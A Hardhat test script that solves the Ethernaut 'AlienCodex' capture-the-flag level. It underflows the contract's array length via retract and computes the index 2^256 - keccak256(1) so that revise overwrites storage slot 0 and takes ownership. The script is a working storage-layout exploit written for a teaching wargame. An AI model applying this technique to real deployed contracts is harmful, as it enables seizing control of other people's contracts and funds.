import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`AlienCodex`);
  const challengeAddress = await createChallenge(
    `0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  // we need to make contract first to pass the modifier checks of other functions
  tx = await challenge.make_contact();
  await tx.wait();

  // all of contract storage is a 32 bytes key to 32 bytes value mapping
  // first make codex expand its size to cover all of this storage
  // by calling retract making it overflow
  tx = await challenge.retract();
  await tx.wait();

  // now try to index the map in a way such that we write to the owner variable
  // at slot 0
  // > In the case of a dynamic array, the reserved slot contains the length
  // of the array as a uint256, and the array data itself is located sequentially
  // at the address keccak256(p).
  // https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#solidity-storage-layout
  // https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html#mappings-and-dynamic-arrays

  // codex[0] value is stored at keccak(codexSlot) = keccak(1)
  // codexSlot = 1 because slot 0 contains both 20 byte address (owner) & boolean
  // needs to be padded to a 256 bit
  const codexBegin = BigNumber.from(
    ethers.utils.keccak256(
      `0x0000000000000000000000000000000000000000000000000000000000000001`
    )
  );
  console.log(`codexBegin`, codexBegin.toHexString());
  // need to find index at this location now that maps to 0 mod 2^256
  // i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
  const ownerOffset = BigNumber.from(`2`).pow(`256`).sub(codexBegin);
  console.log(`owner`, await eoa.provider!.getStorageAt(challenge.address, ownerOffset))
  
  const eoaAddress = await eoa.getAddress()
  tx = await challenge.revise(ownerOffset, ethers.utils.zeroPad(eoaAddress, 32));
  await tx.wait();
  console.log(`owner`, await eoa.provider!.getStorageAt(challenge.address, ownerOffset))
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
